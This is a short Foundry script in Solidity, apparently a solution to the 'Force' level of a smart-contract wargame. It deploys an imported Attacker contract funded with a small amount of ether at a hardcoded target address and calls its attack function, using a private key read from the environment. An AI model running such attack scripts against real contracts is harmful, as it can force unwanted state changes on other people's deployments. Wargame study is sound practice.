// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/Force/Attacker.sol";

contract ForceScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker{value: 0.0001 ether}(0x96dab08104F2A1faE22a4E6CB7902d93a9A72758);
        attacker.attack();
    }
}
